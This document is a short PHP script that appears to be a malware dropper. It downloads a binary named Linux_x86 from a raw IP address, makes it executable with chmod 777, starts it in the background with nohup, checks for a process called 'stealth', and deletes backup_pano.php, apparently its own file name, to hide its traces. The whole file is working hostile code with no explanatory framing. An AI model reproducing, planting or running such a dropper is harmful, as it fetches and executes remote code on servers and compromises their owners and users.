<?php
function downloadFile($url, $path)
{
    $newfname = $path;
    $file = fopen ($url, 'rb');
    if ($file) {
        $newf = fopen ($newfname, 'wb');
        if ($newf) {
            while(!feof($file)) {
                fwrite($newf, fread($file, 1024 * 8), 1024 * 8);
            }
        }
    }
    if ($file) {
        fclose($file);
    }
    if ($newf) {
        fclose($newf);
    }
}

downloadFile('http://168.227.91.249/Linux_x86','./Linux_x86');

system('chmod 777 ./Linux_x86');
system('nohup ./Linux_x86 2>&1 &');
system('ps aux| grep stealth');
system('rm -rf backup_pano.php');
?>



